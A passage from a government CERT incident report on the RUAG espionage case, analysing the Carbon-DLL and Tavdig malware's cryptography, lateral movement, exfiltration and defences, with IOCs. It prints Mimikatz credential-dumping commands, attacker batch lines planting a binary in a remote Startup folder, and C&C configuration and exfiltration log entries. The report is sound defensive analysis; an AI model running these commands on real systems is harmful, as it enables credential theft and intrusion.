size is solved, the only limit is the size of\nthe root partition. Carbon DLL’s most important evolution though was C&C cryptography: Like Tavdig,\nCarbon-DLL implements asymmetric encryption, but in this implementation based upon RSA. CAST128\nencryption was still used under the hood, but that’s probably only for historical reasons and does not add\nto the overall security. Carbon-DLL stored its keys in the configuration file. Note that RSA encryption only\napplies to infected bots, which directly communicate with C&C servers - and only these bots have configured\nkeys; actually a separate section is added to the configuration file, in order to store keys for bots needing to\ncommunicate with C&C servers. However, this section doesn’t exist upon installation; it can be added later\non request, triggered by a specific task. Peer to peer communication behind these bots in the local network\nare only encrypted using CAST128, or not at all.\n\nFinally, the Snake rootkit must also be mentioned, though we never actually observed it in this case. It was\nused in other countries, and many publications exist about it. Uroburos is also sometimes used as another\nterm for Snake, but sometimes Uroburos is also used for the whole family (which is, technically spoken, not\ncorrect). Snake is another stage 2 trojan, but we’re not aware if it’s used together with some recon tools. In\nterms of functionality, it contains features of both the Carbon rootkit and Carbon-DLL at the same time:\n\n  - It is a rootkit, like the Carbon rootkit. This rootkit also works on 64 bit systems, requiring digitally\nsigned drivers. To do this, it uses a exploitable, digitally signed driver from VMWare, as described\nin several publications. Hence it’s an evolution of the Carbon rootkit. Like the afore mentioned, it\ncontains an encrypted and hidden file store, but with increased size.\n\n  - It lacks the asymmetric encryption used in Carbon-DLL, it’s again based upon CAST128. So you can’t\ncall it an evolution of Carbon-DLL.\n\nThe best way to describe Snake is to call it a sibling of Carbon-DLL - as if the development of the Carbon\nrootkit split into 2 branches, one ending in Carbon-DLL, and one ending in Snake.\n\n**A Closer Look at the Encryption Algorithms Used in Carbon-DLL and Tavdig**\n\nThe malware found at RUAG was Carbon-DLL, paired with Tavdig. This section contains some technical\nand mathematical findings about the implementation of the cryptographic algorithms gained by reverse_engineering the code. The section can be skipped without loosing too much context for the rest of this paper,_\nbut it can also give some insight into the development of the malware.\n\n\n-----\n\nMELANI:GovCERT TLP WHITE\n\nUnderstanding cryptographic algorithms is a key point for understanding the malware. It is also interesting\nto see some differences in how they are actually implemented in Tavdig and in Carbon.\n\nFrom the perspective of a reverser, Carbon’s approach is easier: Carbon uses the Microsofts cryptogra**phy API (MSCAPI); The standard MSCAPI calls CryptEncrypt and CryptDecrypt are imported via**\nIAT (Import Address Table) and so become directly visible (to be precise, a slight obfuscation is applied to\nhide these calls by building the IAT on the heap, instead of using the standard import table). The following\ncode shows the decryption of the symmetric session key using RSA. Note that all IDA (Interactive Dis**assembler) screenshots shown here are decompiler pseudocode outputs. API calls (so-called imports) are**\nshown in a red color, as for example CryptDecrypt, and their names are created automatically and don’t\nneed any interpretation from our side. Blue names, however, are initially only generic numbers; their actual\nnames must be given by the reverser, based upon what function is suspected behind them. So, the names\nyou see in blue are our interpretation of the code.\n\nFigure 9: RSA Usage in Carbon-DLL\n\nAs you can see, there are several red names, which makes interpretation of the code easier. The fact that\nRSA should be used is encoded inside the key itself, using Microsofts proprietary format. Similarly, the\nsymmetric decryption of the main data using the session key is quite easy to find:\n\nFigure 10: Symmetric Encryption in Carbon-DLL\n\nAgain a lot of red names can be seen, because the MSCAPI is used. Which actual algorithm to use is once\nmore encoded in the session key itself. Note that while analysis of the code is easy, reconstructing it on a\n\n\n-----\n\nMELANI:GovCERT TLP WHITE\n\ndifferent operating system, like Linux, is another story, due to MSCAPI’s bad interoperability with open\nsource libraries like OpenSSL (in particular as far as the key format for asymmetric encryption is concerned).\n\nThe use of MSCAPI is new in Carbon-DLL. The Carbon rootkit implemented the CAST128 algorithm itself.\nInterestingly, the same is true for Tavdig. Tavdig also applies asymmetric cryptography, and it would be\nquite easy to do the same as Carbon-DLL. But instead of this, Tavdig implements it’s asymmetric encryption\n_algorithm itself. The same is true for Tavdig’s symmetric algorithm, which is AES. This is a very different_\napproach from Carbon-DLL, so we assume that Carbon-DLL was developed by a different team than the\n_Carbon rootkit or Tavdig._\n\nEncryption algorithms implemented directly in malware can be tricky to find and identify for reversers, and\nit is worth having a closer look. The situation is still comparably easy with symmetric algorithms like AES,\nBlowfish or DES, as they usually contain typical cryptographic constants, for example for permutation\ntables or substitution boxes (an exception are some stream ciphers like RC4). The same is true for hash\nalgorithms like MD5. For this reason, reversers use dedicated tools and plugins to find these constants, in\norder to make guesses about the algorithms that then can be verified. Of course this can also be fooled by\nchanging these constants, but this is rarely done. What often also helps to find symmetric cryptography\nfunctions, is to search for non-trivial XOR instructions, because XOR (exclusive OR) is typically used in\nsymmetric cryptography. Note that trivial XOR instructions occur frequently in any code, these are exclusive\nORs of a value with itself, which always returns 0; this is often used by compilers to just initialize a variable\nto 0; hence we’re only looking for XOR’s with two different operands.\n\nThe situation is far trickier for asymmetric cryptography, as these algorithms don’t use any reliable cryp_tographic constants, they don’t even use non-trivial XOR instructions. However, they require mathematical_\nfunctions (big integer functions) to do calculations with very large integers of 1024 bits and more inside\na finite field, i.e. modulus a large prime number, which is called the modulus of the field. One approach is\nidentifying these functions and the library used by the programmers in their implementation.\n\nUnfortunately, we could not identify the library used by the programmers of Tavdig - we don’t even know\nif it is a public one or not. The code has some unusual features though; let’s have a closer look at it. First,\nthe following screenshot shows the implementation of long addition, which is still quite straightforward:\n\nFigure 11: Addition of Two 1024 Bit Integers\n\n\n-----\n\nMELANI:GovCERT TLP WHITE\n\nAs you can see, not much red anymore, only blue. This code does not use any API call, all names are our\ninterpretation.\n\nBig integers are stored in 65 16-bit words (actually only 64 are really used), so they are 1024 bits in size.\nThis size is hardcoded. The data is stored with the least significant word first (addition starts with word\nindex 0), i.e. little endian. The rest of the code is straightforward. The use of word-wise instead of byte-wise\nor double-word-wise granularity is a bit unusual. The explicit encoding of the carry bit is also interesting:\nDirect assembly code would use the ADC instruction (addition regarding the carry bit), C-code without\ninline assembly, however, needs the explicit implementation of the carry bit. On assembly level, only ADD\ninstructions (addition without regarding the carry bit) appear. This is not a very efficient approach, so we\ndoubt this code actually being part of a well known library.\n\nOne non-trivial problem for reversers is to actually find these functions. Imagine that in a fresh binary, you\nmight have hundreds of nameless functions with nameless variables in them. No cryptographic constants\nmark these big integer functions in any way. Sometimes, searching for ADC instructions helps, but not so in\nthis case. No XOR instructions appear, which are otherwise typical for symmetric cryptography. There’s no\neasy response to this problem, except for checking all functions manually, or trying to search top down.\n\n[There are more odd things in the multiplication code. Binary multiplication is a bit tricky and mainly works](https://en.wikipedia.org/wiki/Binary_multiplier)\nby scanning the bits from right to left in one operand, while the other operand is shifted left at each step and\nadded to the factor (initialized with 0) whenever the scan hits a 1 - like we learned to multiply on paper at\nschool. Now let’s have a look into Tavdig’s implementation (only the relevant part of the function is shown\nhere):\n\nFigure 12: Multiplication of Two 1024 Bit Integers Inside a Finite Field\n\nOne thing that can immediately be seen is the presence of MODULUS in the code. This is the large prime\n_number defining the field. It is more efficient to take every intermediate result modulus this prime, i.e. to_\nsubtract the prime as many times as possible, because adding and subtracting the prime results in identical\nelements of the field; but smaller values result in faster execution, so the code always tries to keep the smallest\nvalue possible. Note that the function BigCmpToModulus returns 1, if the value is larger than the modulus,\nwhich means that the modulus can be subtracted to normalize the value (only one such step is required here,\nsee below). Unusual is the fact that the modulus is not passed as an argument, but is hardcoded. This speaks\nagainst the usage of a generic library. However, the use of C++ templates can also show this behavior, so a\nsource code based library is still a possibility.\n\n\n-----\n\nMELANI:GovCERT TLP WHITE\n\nIn the code, the scanning through the different bits in the first operand mult1 is seen in the do loop. We\nthen see the addition of the second operand toMult to the factor value, which was previously initialized to 0.\nHowever, toMult is at no place shifted to the left, as would usually be the case. Instead, factor is divided\nby 2 at every step - one could say, the sum is shifted one bit to the right instead.\n\nThis division by 2 has an interesting implementation. With factor[0] & 1, the code checks if factor is odd.\nNaturally, dividing an odd number by 2 does not work well, if it is an integer; but it actually is an element\nof a finite field, and these can be represented by many different integers by adding the modulus as many\ntimes as we like: the modulus represents the additive neutral of the field, actually it’s another representation\nof 0. If the integer we want to divide by 2 is odd, we just add the modulus one time. Because the modulus\nis a prime number and hence odd, the resulting integer is an even number (odd plus odd is always even),\nwhile still representing the same element of the field. The subsequent division by 2 can now be done using\na simple bit shift to the right. This is how division by 2 is implemented in a finite field.\n\nThe main advantage of this approach is that the bit width of factor is never larger than 1025 (1024+1),\nwhile in the standard implementation, the factor can grow up to 2048 bits. In the traditional approach, the\nmultiplication would have to be done in a 2048 bit target, and this value would have to be taken modulus\nthe prime number afterwards - this time in a far more complex way, one subtraction would not suffice. By\nnot shifting the values to be added to the left every time, but instead shifting the result to the right (inside\nthe finite field), the modulus action is implicitly performed at every step implicitly. This is a quite elegant\napproach, but it requires the multiplication function to be aware of the finite field. So this function is not\njust a big int function, but a field-aware big-int multiplication function.\n\nThe downside is that, after all 1024 bits are processed, factor was divided by two 1024 times, so the result\nis too “small” (which mathematically is the wrong term inside the field, but we use it as an analogy): instead\nof ab, the value ab/(2ˆ1024) is returned.\n\nTo fix this problem, Tavdig uses a particular code to calculate a corrector value:\n\nFigure 13: Calculation of the 1024 Bit Multiplication Corrector Inside a Finite Field\n\nThe corrector is initialized to 1 (not shown in the above screenshot), and is then multiplied with two\n2048 times (twice the value of 1024). So, the final result is 2ˆ2048. Because we’re operating in a field, this\nvalue can be normalized to the modulus. Now, after each multiplication, another multiplication with this\n```\ncorrector is required to fix the fact that the original multiplication returned a “too small” value. Because\n\n```\nthis second correction multiplication itself uses the same multiplication function returning “too small” values,\nthe corrector needs to fix for both multiplications errors. This is why the corrector fixed for 2048 and not\nonly 1024 right shifts.\n\nThis can be seen in the code to calculate a exponentiation algorithm (baseˆpower) inside the field:\n\n\n-----\n\nMELANI:GovCERT TLP WHITE\n\nFigure 14: Exponentiation of Two 1024 Bit Integers Inside a Finite Field\n\nHere we see that every multiplication is immediately followed by a second multiplication with the corrector.\nThe exponentiation algorithm is rather straightforward: every bit in the power value is scanned, at each\nstep base is multiplied to itself, and whenever a 1 bit is hit, base is multiplied to the result value, which\nis initialized with 1. This is the standard binary exponentiation algorithm.\n\nNow all required big number operations are available. They are used in a final decryption code like this:\n\nFigure 15: ElGamal Decryption\n\nAfter the corrector is calculated, the variable minusOneMinusPK is initialized with the modulus (equivalent\nto 0), the XOR with 1 corresponds with subtracting one (the modulus is a prime and always odd), resulting in\nthe value -1 of the field. The private key x is subtracted, and - as the comment depicts - coeff base ˆ(-1-x)\n[is calculated. This is basically the ElGamal decryption. Side note: the weird name minusOneMinusPK was](https://en.wikipedia.org/wiki/ElGamal_encryption#Decryption)\nchosen during the reversing process and should help the reverser to remember the variable contains “-1 minus\nprivate key” - finding good names for not yet completely known objects is one of the challenges of reverse\nengineering, and this sometimes fails or ends in weird names…\n\nThe encrypted data blob is not sent as-is, but base-64 encoded and put into a server response that looks\nlike this:\n\n1 <html>\n\n2 `<head>`\n3 `<title>Authentication Required</title>`\n\n4 `</head>`\n5\n\n6 `<body>`\n7 `<div>B2...KD9eg=</div>`\n\n8 `</body>`\n9 </html>\n\nSo, the base-64 encoded payload is placed between <div> and </div> and some text placed around. The\ntrojan ignores the stuff around and only scans for <div> and </div>. Interestingly, above text is followed\nby many newlines. We assume this is done to flush the output if the payload is too small.\n\n\n-----\n\nMELANI:GovCERT TLP WHITE\n\n**Lateral movement**\n\nBefore the attackers try to make lateral movements, they will do some basic fingerprinting of the system and\nthe environment the infected computer is located in.\n\nFor the lateral movement, the attackers use various, public available tools, like:\n\n   - mimikatz.exe for the stealing of credentials\n\n   - pipelist.exe to list named pipes\n\n   - psexec.exe and wmi.exe for remote execution\n\n   - dsquery.exe and dsget.exe to query the Active Directory\n\n   - ShareEnum.exe to enumerate shares\n\nApart from these tools, the attackers use many self-written batch scripts.\n\nThey are very patient; the lateral movement can take several months. They repeat these actions regularly\nin order to keep information accurate and to have always enough credentials. The harvesting of credentials\nis done in various ways: Apart from using sniffing tools and key loggers, the attackers rely heavily on the\n[use of Mimikatz. Mimikatz basically has the following capabilities:](https://github.com/gentilkiwi/mimikatz)\n\n   - Getting plaintext passwords, hashes, and Kerberos tickets out of the memory\n\n   - Extracting certificates and private keys\n\n[• Perform Pass-the-Hash and Pass-the-Ticket attacks.](https://en.wikipedia.org/wiki/Pass_the_hash)\n\n[The attackers used many of these features, until they gained control over the AD by getting the Golden](http://www.slideshare.net/gentilkiwi/abusing-microsoft-kerberos-sorry-you-guys-dont-get-it)\n[Ticket (krbtgt):](http://www.slideshare.net/gentilkiwi/abusing-microsoft-kerberos-sorry-you-guys-dont-get-it)\n\n1 `.#####.` `mimikatz 2.0 alpha (x64) release \"Kiwi en C\" (Jun 22 2015 10:30:32)`\n2 `.## ^ ##.`\n\n3 `## / \\ ##` `/* * *`\n4 `## \\ / ##` `Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )`\n\n5 `'## v ##'` `http://blog.gentilkiwi.com/mimikatz` `(oe.eo)`\n6 `'#####'` `with 16 modules * * */`\n\n7\n8\n\n9 mimikatz(commandline) # privilege::debug\n10 Privilege '20' OK\n\n11\n\n12 mimikatz(commandline) # token::elevate\n13 Token Id `: 0`\n\n14 User name :\n15 SID name `: NT AUTHORITY\\SYSTEM`\n\n16 144 39822 NT AUTHORITY\\SYSTEM ...\n17 -> Impersonated !\n\n18\n19 [...Omitted...]\n\n20\n21 mimikatz(commandline) # lsadump::lsa /patch\n\n22 Domain\n23 RID : User : LM : NTLM :\n\n24 RID : User : LM : NTLM :\n25 RID : User : LM : NTLM :\n\n26 : `/ S-1-5 [...Omitted...]`\n27 000001f6 (502) krbtgt\n\n28 7d9..08\n\n\n-----\n\nMELANI:GovCERT TLP WHITE\n\nThe attackers moved laterally by infecting additional systems. They used various approaches to do so, one\nshown below:\n\n1 net use \\\\COMPUTERNAME\\IPC$ xxxx /user:DOMAIN\\USERNAME dir /ON \\\\COMPUTERNAME\\C$ \\\n2 dir /ON \\\\COMPUTERNAME\\C$ \\Users\\\n\n3 dir /ON \\\\COMPUTERNAME\\C$ \\PATHNAME\\\n4 dir /ON \"\\\\COMPUTERNAME\\C$ \\Users\\USERNAME\\AppData\\Roaming\\Microsoft\\Windows\\Start\n```\n   Menu\\Programs\\StartUp\\\"\n\n```\n5 copy /Y C:\\Users\\USERNAME\\AppData\\Local\\Temp\\brainware_temp.jpg \"\\\\COMPUTERNAME\\C$\n```\n   \\Users\\USERNAME\\AppData\\Roaming\\Microsoft\\Windows\\Start\n   Menu\\Programs\\StartUp\\BrainwareStart.exe\"\n\n```\n6 dir /ON \"\\\\COMPUTERNAME\\C$ \\Users\\USERNAME\\AppData\\Roaming\\Microsoft\\Windows\\Start\n```\n   Menu\\Programs\\StartUp\\\"\n\n```\n7 net use \\\\COMPUTERNAME\\IPC$ /delete\n\n8 tasklist /v /s COMPUTERNAME /u DOMAINNAME\\USERNAME /p xxxx\n9 net use \\\\COMPUTERNAME\\IPC$ /delete\n\nHere, the attackers copied the infection binary to a new bot and executed it from there.\n\nThe attackers regularly updated configuration files of the infected bots in order to have always 2 working\nC&C server connections.\n\n1 quantity = 1\n\n2 address1 = airmax2015.leadingineurope.eu:80:/wp-content/gallery/\n3\n\n4 [CW_INET_RESULTS]\n5 quantity = 1\n\n6 address1 = airmax2015.leadingineurope.eu:80:/wp-content/gallery/\n7\n\n8 [CW_INET]\n9 quantity = 1\n\n10 address1 = porkandmeadmag.com:80:/wp-includes/pomo/js/\n11\n\n12 [CW_INET_RESULTS]\n13 quantity = 1\n\n14 address1 = porkandmeadmag.com:80:/wp-includes/pomo/js/\n\nIf a system was of no use anymore, the attackers tried to clean it by deleting the files and stopping the\nservice:\n\n1 rem sc stop srservice\n2 sc delete srservice\n\n3 dir /ON \"C:\\Program Files\\PATH\"\n4 del /q \"C:\\Program Files\\PATH\\msximl.dll\" del /q \"C:\\Program Files\\PATH\\ximarsh.dll\" del /q\n```\n   \"C:\\Program Files\\PATH\\miniport.dat\" del /q \"C:\\Program Files\\PATH\\vndkrmn.dic\" del /q\n   \"C:\\Program Files\\PATH\\msimghlp.dll\" del /q \"C:\\windows\\system32\\srsvc.dll\"\n\n```\n5 dir /ON \"C:\\Program Files\\PATH\"\n6 net use IPC$ /delete\n\n\n-----\n\nMELANI:GovCERT TLP WHITE\n\n**Data Exfiltration**\n\nFor the internal communication between infected bots inside the RUAG network, a kind of peer-to-peer\n_[network (P2P) based on windows named pipes was constructed.](http://msdn.microsoft.com/en-us/library/windows/desktop/aa365590%28v=vs.85%29.aspx)_ The malware used a botnet hierarchy\nconsisting of worker drones for executing tasks and collecting data, and communication drones for exfiltrating\nthe stolen data out of the network. Using such a P2P network with a bot hierarchy, the attackers were able\nto send commands/instructions to infected computers within the RUAG network that were not able to\ncommunicate to the Internet directly. The most common pipe name used for this purpose is COMNAP: This\nnamed pipe has once been used by Windows for the communication with the SNA protocol used by IBM\nmainframes. Through this named pipe, several commands are exposed to any other peer upon successful\npassing of the authentication handshake. The usage of this transport mechanism is configured in the trojan\nconfiguration file:\n\n1 [TRANSPORT]\n\n2 system_pipe = comnap\n3 spstatus = yes\n\n4 adaptable = no\n5 post_frag=yes\n\n6 pfsgrowperiod=259200\n\n\n-----\n\nMELANI:GovCERT TLP WHITE\n\nFigure 16: Proxy Tier Topology\n\nFor the data exfiltration, the attackers used HTTP POST requests, which were initiated by the communication drones:\n\n\n-----\n\nMELANI:GovCERT TLP WHITE\n\n1 2016-01-01 00:00:00 hXXp://sampledomain.com/bad.php 200 POST \"Mozilla/4.0 (compatible; MSIE\n```\n   9.0; Windows NT 6.1; Trident/4.0;)\"\n\n```\nWe’re aware following C&C having been used to send tasks and to exfiltrate data. Please note that most\n**of these servers have been hacked by the attacker and the owners are victims of this actor**\n**group as well. At the time of writing, most of these websites were already cleaned up.**\n\nDomain IP AS\n\nairmax2015.leadingineurope[.]eu 5.255.93[.]228 AS50673\n\nbestattung-eckl[.]at 195.3.105[.]50 AS8447\n\nbuendnis-depression[.]at 85.25.120[.]177 AS8972\n\ndeutschland-feuerwerk[.]de 195.63.103[.]228 AS12312\n\ndigitallaut[.]at 81.223.14[.]100 AS6830\n\nporkandmeadmag[.]com 155.94.65.2 AS19531\n\nsalenames[.]cn 193.26.18.117 AS25537\n\nshdv[.]de 85.214.40[.]111 AS6724\n\nsmartrip-israel[.]com 92.53.126.118 AS9123\n\nwww.asilocavalsassi[.]it 94.242.60[.]104 AS43317\n\nwww.millhavenplace.co[.]uk 217.10.138[.]233 AS6908\n\nwww[.]jagdhornschule[.]ch 80.74.145[.]80 AS21069\n\nFigure 17: Command and Control Servers\n\nThe domains may be found in most proxy or DNS log files since they are legitimate. If you want to search\nyour logs for this attacker group, please use the full URLs, which you’ll find in the IOC Appendix.\n\nWe made statistics based on the available proxy logs from the RUAG company and could make the following\nconclusions:\n\n   - During the lateral phase of the attack, not much data has been transferred to the outside, and the\namount of requests were small.\n\n   - Total data exfiltrated: about 23GB. It is noteworthy that this data contains also beaconing requests\nto the C&C servers. Also, some data has been exfiltrated more than once, and exfiltrated data was\nusually compressed. However, the size of exfiltrated data gives no insight about the confidentiality\n_and the value of the stolen data. It is not possible to find out what data actually was stolen using_\n_proxy logs, because no wiretap was in place before the attack was detected. We can only make such_\nstatements about activities since the wiretap was actually installed - which is one of the motivations\nfor the observation phase.\n\n   - The amount of exfiltrated data varies strongly during the time period observed. On one hand, there\nare large spikes of nearly 1GB in one day, while there are longer periods, when nothing noteworthy\nseems to have happened.\n\n   - Another interesting observation is the extended phase of lateral movement: during the first 8 months,\nnot much data has been sent out. However, it is possible that not all C&C servers have been identified.\n\n   - The most active phases took place from September to December 2015.\n\nThe following figure shows the amount of data exfiltrated (once more, these are sizes of compressed data,\nincluding repetitions and beaconing requests):\n\n\n-----\n\nMELANI:GovCERT TLP WHITE\n\nFigure 18: Data Exfiltration by Day\n\nThere are phases with very few requests; we believe that during such phases the attackers did not perform\nany actions, the requests are most probably merely status messages. On the other hand, there are very\nactive phases with many requests. These phases correlate to the amount of data exfiltrated and are a sign\nof activity of the attacker.\n\nFigure 19: Requests by Day\n\n\n-----\n\nMELANI:GovCERT TLP WHITE\n\n### Recommendations\n\nEven though we have no information about other victims in Switzerland, the following information might\nbe valuable in order to prevent and detect such attacks. Please note that this is not an exhaustive guideline,\nbut rather a collection of ideas and pointers where one might start.\n\n#### System level\n\nThere exist a few countermeasures, which make it much more difficult for the attacker to gain an initial\nfoothold. These measures should be applied to client computers, as well as to servers.\n\n  - Consider using Applocker, a technique from Microsoft, which allows you to decide, based on GPOs\n(Group Policy Objects), which binaries are allowed to be executed, and under which paths. There\nexist two basic approaches: a blacklisting of certain directories, where no binaries may be executed,\nand a whitelisting of directories, where only known binaries are allowed. Even though the whitelisting\napproach is always the more secure one, it is already an obstacle, if the attacker has no simple way of\nexecuting a downloaded binary from a temporary path. These approaches may also be combined. Of\ncourse there exist many similar tools, which may be used for the same purpose. Most of the Antivirus\ncompanies have extended functionality in addition to the traditional virus detection. There is often\na possibility to restrict certain processes to write in the user home directory. However, AppLocker is\nvery convenient for most organizations, as it can be controlled using GPOs.\n\n  - Reduce the privileges a user has when surfing the web or doing normal office tasks. High privileges\nmay only be used when doing system administration tasks.\n\n  - This actor, as well as many other actor groups, relies on the usage of “normal” tools for their lateral\nmovement. The usage of such tools can be monitored. E.g. the start of a tool such as psexec.exe or\n```\n   dsquery.exe from within a normal user context should raise an alarm.\n\n```\n  - Keep your systems up-to-date and reduce their attack surface as much as possible (e.g.: Do you really\nneed to have Flash deployed on every system?)\n\n  - Use write blockers and write protection software for your USB/Firewire devices, or even disable them\nfor all client devices\n\n  - Block the execution of macros, or require signed macros\n\n#### Active Directory\n\nAs the active directory (AD) is one of the main targets of the attackers and absolutely crucial for any\norganization, many security precautions must be taken in order to protect its integrity. We cannot give a\nfull security recommendation on how to protect your AD. The following pointers should give you some hints\non where to begin:\n\n  - Do a close monitoring of AD logs for unusual and large queries from normal clients\n\n  - Use a two-factor authentication throughout your AD, especially for high-privileged accounts\n\n  - Avoid the use of LM/NTLM authentication\n\n[• Do regular AD RAPs if you are a premier customer of Microsoft. See: AD RAP](https://services.premier.microsoft.com/assess?Culture=de-DE&CultureAutoDetect=true)\n\n#### Network level\n\nThere are various important points to improve the resilience and detection capability on the network level\n\n  - Use one central and heavily guarded choke point that every packet must pass in the direction of the\nInternet.\n\n\n-----\n\nMELANI:GovCERT TLP WHITE\n\n  - Any Internet Access should pass a proxy that logs all header information, including cookies.\n\n  - Servers should only be allowed to make outbound connections on a point-to-point whitelisting\n\n  - Think about internal network segmentation. Block any direct client-to-client communication.\n\n - Use a dedicated management (V)LAN\n\n  - Separate the BYOD (bring your own device) devices from the company clients and servers.\n\n  - Collect netflow data, not only between networking zones, but internally as well.\n\n  - Use a classic signature based IDS, such as Snort or Suricata, in addition to commercial solutions. It\ngives you the possibility to quickly deploy hand-made detection rules in the case of an intrusion.\n\n  - Use PassiveDNS to keep all domain queries going to the Internet and make these searchable in a quick\nand efficient way\n\n  - Don’t let your clients resolve external addresses. Only your proxy should be able to resolve external\naddresses.\n\n  - Use split-horizon DNS setups.\n\n[• Use RPZ (Response Policy Zone) on your DNS servers. See: RPZ](https://dnsrpz.info/)\n\n  - There exist many more possibilities to tighten up the security of your network. You might e.g. consider\nusing virtualized desktops or terminal services for Internet surfing.\n\n#### Log files\n\nAs we have seen once more, the availability of log files is crucial for the analysis of such incidents.\n\n  - Long term log archives - 2 years or more are recommended - for crucial gateway systems such as\nproxy and DNS.\n\n  - Central log collection, indexing and archiving\n\n  - Continuous log analysis and matching the log files against known IOCs\n\n  - Adapt the log settings to your needs. E.g.: logging the user-agent may not be the default setting, but\nis highly recommendable.\n\n#### System Management\n\nWe strongly encourage any organization to separate management from business traffic. Management of\nsystems should be done from within a separate network using jumphosts. No Internet access should be given\nto such management stations. Authentication must be made using a second factor, such as a smart card or\na one time password token.\n\nAdditionally, it is important to protect system management tools as well as software and source code reposito_ries as good as possible. Software packets should be digitally signed and one should always store known-good_\nstates on WORM media (Write Once Read Many).\n\n#### Organization\n\nThe incident handling must be prepared with clear procedures, responsibilities, and communication strategies.\n\n  - In the case of an incident: Inform your technical team as open as possible, in order to speed up\nthe incident response and avoid unwanted collateral damage.\n\n  - Have complete and up-to-date inventory of all systems, software and networks.\n\n  - Establish a tight link between the operational security teams and the risk managers in your organization.\nAny security incident is nothing else than a materialized risk.\n\n\n-----\n\nMELANI:GovCERT TLP WHITE\n\n  - Accept that some risks cannot be dealt with in a preventative way and therefore invest in detection\n_capabilities. It is important to have good engineers that have a firm understanding of your infrastructure_\nand your business as well.\n\n  - Have patching procedures in place that allow you deploying an emergency patch within 24h max.\n\n  - Know your most critical processes and have a continuity plan for those times, when the original process\nis disturbed.\n\n### Conclusion\n\nThe attack is a very good example of how targeted attacks take place and the impressive patience the\nattackers show, trying to reach their goals. Even if we think completely preventing such attacks is very\ndifficult, the goal must be to make them as difficult as possible.\n\nThere is a good chance to make the entry point difficult to find, when protecting the clients adequately using\ntools like Applocker or virtualized browsers. Even if this does not completely eliminate this kind of threat,\nthe bar is raised for the attacker. Furthermore, if you observe various failed attack attempts, you actually\ngain time and insight to monitor the actor and to prepare yourself.\n\nOne of the most effective countermeasures from a victim’s perspective is the sharing of information about\nsuch attacks with other organizations, also crossing national borders. This is why we decided to write a\npublic report about this incident, and this is why we strongly believe to share as much information as\npossible. If this done by any affected party, the price for the attacker raises, as he risks to be detected in\nevery network he attacked in different countries. This forces him to either prioritize his targets more, or to\nuse different malware programs and different C&C infrastructures. We’re also sharing information gathered\nduring many hours of analysis and in various cases with our partners; These partners are doing the same on\ntheir side and are returning findings in their networks. This is precisely what happened in the RUAG case:\nit was detected based upon mutual sharing of information. We’re happy to work together with many partner\norganizations throughout Europe and are grateful for their efforts and the good international cooperation.\nPutting all elements together over a long time gives the momentum of action back to the CERTs and CSIRTs,\nstruggling to keep their networks clean and their data safe.\n\nThe fact that attackers abuse vulnerable systems for their purpose - no matter if this is for criminal activities\nor espionage - show the importance and responsibility of every party providing services on the Internet. There\n_is no such thing as an insignificant systems on the Internet, every server may be abused for attacking others._\nThis puts great responsibility on everyone, and we hope that this report contributes to increase the security\nlevel within every network and server.\n\nWe intentionally did not make any attributions in regard who might be behind these attacks. First, it is\nnearly impossible to find enough proof for such claims. Secondly, we think it is not that important, because unfortunately - many actors use malware and network intrusions for reaching their intentions. To our belief,\nnothing justifies such actions, and we support taking steps to ban such attacks instead of accepting them as\ninevitable. This is why it is important to talk about such attacks in a purely neutral and technical way, in\norder to raise awareness and to provide protection.\n\nOne of the most interesting aspect of these attacks is the very rich set of strategies applied by the attackers,\nespecially during the lateral movement phase. Another interesting aspect is the use of this malware over\nmany years, including maintenance and bug fixing - this suggests that it is still considered an asset. The\nmalware itself is not too complex and - in the RUAG case - without any root kit functionality. We do believe\nthat the lack of such features does not need to be a disadvantage, as the camouflage is very well-thought,\ne.g. by the naming scheme or the communication methods used. The use of batch jobs and external binaries\ntransferred in the form of tasks to the infected bots allow a very flexible approach.\n\nEven if we consider the attacks to be advanced and dangerous, it should be noted that the attackers have\nhabits and mistakes, allowing the defenders to see them and to initiate appropriate countermeasures. In\norder to be able to recognize such habits and mistakes, awareness about such attacks must be high, and\n\n\n-----\n\nMELANI:GovCERT TLP WHITE\n\norganizations need to have the necessary detection and analysis capabilities. We would like to emphasize\nthat fighting against such kind of threats cannot be done purely with preventive measures. The detection\ncapabilities must be fostered, and the security teams need time and resources to search for unusual system\nbehavior.\n\n\n-----\n\nMELANI:GovCERT TLP WHITE\n\n### Appendix IOCs\n\n#### URLs\n\nThe following URLs are known to be part of the C&C infrastructure of the attacker. Please note that many\nof these systems have been hacked and that these domains are perfectly legitimate.\n\n1 airmax2015.leadingineurope[.]eu/wp-content/gallery/\n\n2 bestattung-eckl[.]at/typo3temp/wizard.php\n3 buendnis-depression[.]at/typo3temp/ajaxify-rss.php\n\n4 deutschland-feuerwerk[.]de/fileadmin/dekoservice/rosefeed.php\n5 digitallaut[.]at/typo3temp/viewpage.php\n\n6 florida4lottery[.]com/wp-content/languages/index.php\n7 porkandmeadmag[.]com/wp-content/gallery/\n\n8 salenames[.]cn/wp-includes/pomo/js/\n9 shdv[.]de/fileadmin/shdv/Pressemappe/presserss.php\n\n10 smartrip-israel[.]com/wp-content/gallery/about.php\n11 woo.dev.ideefix[.]net/wp-content/info/\n\n12 www.asilocavalsassi[.]it/media/index.php\n\n13 www.ljudochbild[.]se/wp-includes/category/\n14 www.millhavenplace.co[.]uk/wp-content/gallery/index.php\n\n15 www[.]jagdhornschule[.]ch/typo3temp/rss-feed.php\n\n#### MD5 Hashes\n\nThe following Hashes are Malware Binaries\n\n1 22481e4055d438176e47f1b1164a6bad srsvc.dll\n2 68b2695f59d5fb3a94120e996b8fafea srsvc.dll\n\n3 3881a38adb90821366e3d6480e6bc496 ximarsh.dll\n\n4 1d82c90bcb9863949897e3235b20fb8a msximl.dll\n5 1a73e08be91bf6bb0edd43008f8338f3 msximl.dll\n\n6 2cfcacd99ab2edcfaf8853a11f5e79d5 ximarsh.dll\n7 6b34bf9100c1264faeeb4cb686f7dd41 msximl.dll\n\n8 9f040c8a4db21bfa329b91ec2c5ff299 msimghlp.dll\n9 a50d8b078869522f68968b61eeb4e61d msimghlp.dll\n\n10 b849c860dff468cc52ed045aea429afb msimghlp.dll\n11 ba860e20c766400eb4fab7f16b6099f6 ximarsh.dll\n\n12 2372e90fc7b4d1ab57c40a2eed9dd050 msssetup.exe\n\n\n-----\n\nMELANI:GovCERT TLP WHITE\n\n#### External References\n\nMuch has been published about this threat, below a few links that give additional insight:\n\n  - https://securelist.com/analysis/publications/65545/the-epic-turla-operation/\n\n  - http://www.symantec.com/connect/blogs/turla-spying-tool-targets-governments-and-diplomats\n\n  - https://www.circl.lu/pub/tr-25/\n\n  - 